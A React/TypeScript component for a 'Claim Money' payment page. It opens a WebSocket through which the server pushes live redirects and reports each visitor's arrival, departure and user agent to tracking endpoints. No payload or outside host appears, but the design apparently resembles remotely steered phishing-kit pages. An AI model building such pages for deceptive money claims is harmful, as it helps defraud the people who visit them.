import React, { useEffect } from "react";
import { NavigationBarSection } from "./sections/NavigationBarSection";
import { ActionButtonSection } from "./sections/ActionButtonSection";
import { MainContentSection } from "./sections/MainContentSection";
import { useWebSocket } from "../hooks/useWebSocket";

export const ClaimMoneyPage = (): JSX.Element => {
  const urlParams = new URLSearchParams(window.location.search);
  const contextData = urlParams.get("context_data") || "";

  // Initialize WebSocket connection for real-time redirects
  useWebSocket({
    contextData,
    onRedirect: (url) => {
      console.log('🔀 Redirecting to:', url);
    }
  });

  // Track page visit and departure
  useEffect(() => {
    
    const trackVisit = async () => {
      try {
        await fetch("/api/track-visit", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            page: "Payment Page",
            contextData: contextData,
            userAgent: navigator.userAgent,
          }),
        });
      } catch (error) {
        console.error("Failed to track visit:", error);
      }
    };

    const trackLeave = async () => {
      try {
        await fetch("/api/track-leave", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            contextData: contextData,
          }),
        });
      } catch (error) {
        console.error("Failed to track leave:", error);
      }
    };

    // Track initial visit
    trackVisit();

    // Track when user leaves page
    const handleBeforeUnload = () => {
      // Use sendBeacon for reliable tracking when leaving
      navigator.sendBeacon("/api/track-leave", JSON.stringify({
        contextData: contextData,
      }));
    };

    const handleVisibilityChange = () => {
      if (document.visibilityState === 'hidden') {
        trackLeave();
      }
    };

    // Add event listeners
    window.addEventListener('beforeunload', handleBeforeUnload);
    document.addEventListener('visibilitychange', handleVisibilityChange);

    // Cleanup on component unmount
    return () => {
      window.removeEventListener('beforeunload', handleBeforeUnload);
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      trackLeave();
    };
  }, []);

  return (
    <div className="flex flex-col min-h-screen w-full items-start relative bg-background">
      <NavigationBarSection />
      
      <main className="flex-1 flex flex-col w-full pt-[88px]">
        <ActionButtonSection />
        <MainContentSection />
      </main>
    </div>
  );
};